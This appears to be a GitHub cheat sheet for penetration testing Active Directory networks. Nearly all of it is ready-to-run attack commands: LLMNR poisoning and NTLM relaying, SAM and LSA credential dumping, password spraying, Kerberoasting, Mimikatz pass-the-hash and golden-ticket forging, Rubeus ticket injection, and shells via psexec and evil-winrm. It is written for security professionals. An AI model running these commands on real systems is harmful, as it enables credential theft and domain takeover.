# Active Directory (AD) Penetration Testing Guide

This document provides a comprehensive guide to penetration testing within Active Directory environments. It covers essential topics such as common AD ports and services, various tools and techniques for exploitation, and methods for post-compromise attacks. Each section details specific tools like Responder, Impacket, and Mimikatz, along with practical examples and usage scenarios. Additionally, it includes advanced topics on token impersonation, hash cracking, and domain enumeration. This guide aims to equip security professionals with the knowledge and tools needed to effectively assess and secure AD infrastructures.

[![LinkTree](https://img.shields.io/badge/Link-Tree-bbd343)](https://zishanadthandar.github.io/linktree/)
[![YouTube](https://img.shields.io/youtube/channel/subscribers/UChgqXa2j7ZKkHX2Y76tSxoA)](https://youtube.com/@hackerstation)
[![Sponser](https://img.shields.io/github/sponsors/ZishanAdThandar)](https://github.com/sponsors/ZishanAdThandar)
[![ZishanAdThandar's Pentest Repo stars](https://img.shields.io/github/stars/ZishanAdThandar/Pentest)](https://github.com/ZishanAdThandar/pentest)

## Table of Contents
- [Common Ports in AD](#common-ports-in-ad)
- [NMap](#nmap)
- [Responder](#responder) 
    - [LMNR Poisoning](#lmnr-poisoning)
    - [SMB Relay](#smb-relay)
    - [Responder Attacks](#responder-attacks)
- [enum4linux](#enum4linux)
- [smb-map](#smb-map)
- [smbclient](#smbclient)
- [Impacket](#impacket)
    - [secretdump](#secretdump)
    - [GetUserSPN](#getuserspn)
    - [ntlmrelayx IPV6 mitm6 Attack](#ntlmrelayx)
- [Kerbrute](#kerbrute)
- [Hashcrack](#hashcrack)
    - [NTLM Hash](#ntlm-hash)
    - [Sam Hash](#sam-hash)
    - [Login Token](#login-token)
- [PSEXEC](#psexec)
- [Attacks After Compromise](#attacks-after-compromise)
    - [PowerView](#powerview)
    - [BloodHound](#bloodhound)
- [NetExec (CrackMapExec)](#netexec)
- [Token Impersonation](#token-impersonation)
- [Mimikatz](#mimikatz)
- [Rubeus](#rubeus)
- [evil-winrm](#evil-winrm)
- [External Links](#external-links)

# Common Ports in AD
Active Directory Ports, Services, Vulnerabilities, and Tools
- **Port 53 (DNS)**
  - Vulnerabilities: DNS Cache Poisoning
  - Tools: `nslookup`, `dig`, `dnsenum`, `Fierce`
- **Port 88 (Kerberos)**
  - Vulnerabilities: AS-REP Roasting, Ticket Forging
  - Tools: `impacket`, `Rubeus`, `kerbrute`, `Hashcat`
- **Port 135 (MS-RPC)**
  - Vulnerabilities: DCOM Exploitation
  - Tools: `rpcclient`, `Metasploit`, `nmap`, `Powersploit`
- **Port 137-139 (NetBIOS)**
  - Vulnerabilities: SMB Relay, NTLM Relay
  - Tools: `smbclient`, `Responder`, `impacket`, `nmap`
- **Port 389 (LDAP)**
  - Vulnerabilities: LDAP Injection
  - Tools: `ldapsearch`, `nmap`, `ldapdomaindump`, `NetExec`
- **Port 445 (SMB)**
  - Vulnerabilities: EternalBlue, SMB Relay
  - Tools: `smbclient`, `impacket`, `NetExec`, `nmap`
- **Port 464 (Kerberos Password Change)**
  - Vulnerabilities: Kerberoasting
  - Tools: `impacket`, `Rubeus`, `kerbrute`, `Hashcat`
- **Port 593 (HTTP RPC)**
  - Vulnerabilities: Authentication Bypass
  - Tools: `rpcclient`, `Metasploit`, `nmap`, `Powersploit`
- **Port 636 (LDAPS)**
  - Vulnerabilities: LDAP Injection
  - Tools: `ldapsearch`, `nmap`, `NetExec`
- **Port 3268-3269 (Global Catalog)**
  - Vulnerabilities: LDAP Injection
  - Tools: `ldapsearch`, `nmap`, `NetExec`
- **Port 3389 (RDP)**
  - Vulnerabilities: BlueKeep
  - Tools: `rdp`, `ncrack`, `xfreerdp`, `Metasploit`


## NMap
- LDAP Enumeration `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Kerberos usereneumeration `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>`
- Kerberos usereneumeration with particular wordlist `nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/wordlist/usernames.txt <IP>`

## Responder
- ### LMNR Poisoning
    Responder `responder -I eth0 -rdwv`
- ### SMB Relay
    `nmap --script=smb2-security-mode.sse -p445`
- ### Responder Attacks
    * http off smb off in responder.conf
    - Attack 1
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support
        ```
    - Attack 2
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
        nc 127.0.0.1 {PORT}
        ```
    SHELL command `shares` to get shares name and `use SHARENAME$` to get access.
    - Attack 3
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
        ```
    - Attack 4
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
        ```
        
## enum4linux
- Enumerate Users and Shares with Guest Access:
  - `enum4linux -a -u "" -p "" <DC IP>`
  - `enum4linux -a -u "guest" -p "" <DC IP>`
- Retrieve Group Memberships `enum4linux -G <DC IP>`
- Retrieve Password Policies `enum4linux -P <DC IP>`
## smbmap
- Enumerate SMB Shares with Guest Access:
  - `smbmap -u "" -p "" -P 445 -H <DC IP>`
  - `smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- List Permissions on Shares `smbmap -u "guest" -p "" -P 445 -H <DC IP> -R`
- Upload a File to a Writable Share `smbmap -u "guest" -p "" -P 445 -H <DC IP> -w /path/to/local/file -d /remote/share/directory`
## smbclient
- Enumerate SMB Shares with Guest Access:
  - `smbclient -U '%' -L //<DC IP>`
  - `smbclient -U 'guest%' -L //<DC IP>`
- Check if Anonymous Access is Enabled `smbclient -L \\\\10.10.10.101\\`
- Login as a Specific User `smbclient -L \\\\10.10.10.101\\username`
- Download All Files from a Share `smb: > mget *`
- Check SMB Signing `smbclient -L \\\\10.10.10.101\\ -m SMB2`
- Enumerate Access to Admin Shares `smbclient -U 'admin%' -L //<DC IP>/C$`

## Impacket
- ### secretdump
    - `secretsdump.py domain/user:password@192.168.0.101  #dump hash`
    - Hashdump
       ```bash 
       reg save HKLM\SAM C:\Users\<YourUser>\Desktop\SAM.hiv
       reg save HKLM\SYSTEM C:\Users\<YourUser>\Desktop\SYSTEM.hiv
       secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL
    ```
- ### GetUserSPN
    - Get Login Token with `GetUserSPNs.py domain.tld/username:password -dc-ip 192.158.0.101 -request`
- ### ntlmrelayx
    - IPV6 mitm6 Attack `ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`

## Kerbrute
Repo: https://github.com/ropnop/kerbrute

Notes: https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/
```bash
kerbrute userenum --dc 192.168.1.19 -d domain.tld users.txt #userenum
kerbrute passwordspray --dc 192.168.1.19 -d domain.tld users.txt Password@1 #user bruteforce with known password
kerbrute bruteuser --dc 192.168.1.19 -d domain.tld password.txt admin #password bruteforce with known username
```
## Hashcrack
- ### NTLM Hash
    - **Hashcat**: `hashcat -m 5600 hash.txt rockyout.txt -O`
    - **John the Ripper**: `john --format=netntlm hash.txt --wordlist=rockyou.txt`
- ### SAM Hash
    - **Hashcat**: `hashcat -m 1000 hash.txt rockyout.txt -O`
    - **John the Ripper**: `john --format=NT hash.txt --wordlist=rockyou.txt`
- ### Login Token
    - **hashcat**: `hashcat -m13100 hash.txt rockyout.txt -o`


## PSEXEC

1. use exploit `exploit/windows/smb/psexec` on metasploit
2. `psexec.py domain.tld/username:password@192.168.0.111`
3. `smbexec.py domain.tld/username:password@192.168.0.111`
4. `wmiexec.py domain.tld/username:password@192.168.0.111`

Command to dump hash after shell in metasploit `hashdump`

5. `psexec.py username:@192.168.0.111 -hashes fullhashfirstpart:fullhashanotherpart #Login with dump`

# Attacks After Compromise

## PowerView

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```powershell
powershell -ep bypass 
..\PowerView.ps1
```

```Powershell
Get-NetDomain  # DC info
Get-NetDomainController # DC Info
Get-NetDomainPolicy  # Domain Policy
Get-NetDomainPolicy.{system access} # Specific Policy By Name
Get-NetUser # User Details
Get-UserProperty #user property names
Get-UserProperty -Properties propertyname #specific property
Get-NetComputer -FullData
Get-NetGroup # Get Group Names
Get-NetGroupMember -GroupName "Domain Admin" # Get Group Mamber Names of Specific Group
Invoke-ShareFinder # Share Details

```

## BloodHound

Bloodhound old popular repo https://github.com/BloodHoundAD/BloodHound

Latest Bloodhound version https://github.com/SpecterOps/BloodHound

Also Check: https://github.com/lkarlslund/Adalanche

```bash
neo4j console #neo4j login
bloodhound #bloodhound start in new terminal tab
```

Sharphound Data Collection for bloodhound https://github.com/BloodHoundAD/SharpHound3

```Powershell
powershell -ep bypass 
..\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.zip
```

Upload Zip in BloodHound

Goto Queries and Select Queries

## NetExec

New version of Crackmapexec 

Repo: https://github.com/Pennyw0rth/NetExec

Old version: https://github.com/byt3bl33d3r/CrackMapExec

Old Cheetsheet: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

```bash
# in case of crackmapexec command is cme and for netexec it is nxc. Arguments are same.
nxc smb 10.10.3.0/24 -u username -D Domain.tld -p password # Find login with password
nxc smb 10.10.3.0/24 -u username -H hashdumpedhashlastpart --local # Find login with hash
nxc smb 10.10.3.0/24 -u "FirestName LastName" -H hashdumpedhashlastpart --local-auth # Find login with hash
```

## Token Impersonation

Connect with metasploit psexec `exploit/windows/smb/psexec` using `windows/x64/meterpreter/reverse_tcp` payload.

```bash
meterpreter> load incognito 
meterpreter> list_tokens -u # listing tokens
meterpreter> impersonate_token USERNAME\\Administrator
meterpreter> shell #now you can use shell as USERNAME\\Administrator
meterpreter> rev2self # to reverse impersonationation process, not important command
```


## mimikatz

Repo: https://github.com/ParrotSec/mimikatz

Wiki: https://github.com/gentilkiwi/mimikatz/wiki

- Dump Credentials
    - **Dump SAM Hashes**: `mimikatz.exe "privilege::debug" "lsadump::sam"`
    - **Dump LSA Secrets**: `mimikatz.exe "privilege::debug" "lsadump::secrets"`
    - **Dump DCSync**: `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:USERNAME"`
- Pass-the-Hash
    - **Pass-the-Hash**: `mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH"`
- Kerberos
    - **Purge Tickets**: `mimikatz.exe "kerberos::purge"`
    - **List Tickets**: `mimikatz.exe "kerberos::list"`
    - **Pass-the-Ticket**: `mimikatz.exe "kerberos::ptt TICKET.kirbi"`
- Overpass-the-Hash
    - **Overpass-the-Hash**: `mimikatz.exe "sekurlsa::pth /user:USERNAME /domain:DOMAIN /rc4:HASH"`
- Golden Ticket
    - **Create Golden Ticket**: `mimikatz.exe "kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:HASH /id:500"`
- Silver Ticket
    - **Create Silver Ticket**: `mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:SID /target:SERVICE /rc4:HASH /user:USERNAME /service:SERVICE /id:500"`
- Mimikatz Offline
    - **Read minidump**: `mimikatz.exe "sekurlsa::minidump MINIDUMP.dmp" "sekurlsa::logonPasswords"`


## Rubeus

Repo: https://github.com/GhostPack/Rubeus

- **Request TGT**: `Rubeus.exe asktgt /user:USERNAME /rc4:HASH`
- **Request TGS**: `Rubeus.exe asktgs /user:USERNAME /rc4:HASH /service:SERVICE`
- **Renew TGT**: `Rubeus.exe renew /ticket:TICKET_BASE64`
- **Kerberoast**: `Rubeus.exe kerberoast`
- **Pass-the-Ticket**: `Rubeus.exe ptt /ticket:TICKET_BASE64`
- **Overpass-the-Hash**: `Rubeus.exe tgtdeleg /rc4:HASH /user:USERNAME /domain:DOMAIN`
- **Inject Ticket**: `Rubeus.exe ptt /ticket:TICKET_BASE64`
- **Extract Tickets**: `Rubeus.exe dump`
- **Renew Tickets**: `Rubeus.exe renew /ticket:TICKET_BASE64`
- **S4U**: `Rubeus.exe s4u /user:USERNAME /rc4:HASH /impersonateuser:IMPERSONATE_USER /msdsspn:SPN`

## evil-winrm
https://github.com/Hackplayers/evil-winrm
- Shell with NTLM hash: `evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

# External Links
1. [TryHackMe AttraktiveDirectory Writeup](https://github.com/ZishanAdThandar/WriteUps/blob/main/CTF/tryhackme.com/attacktivedirectory.md)
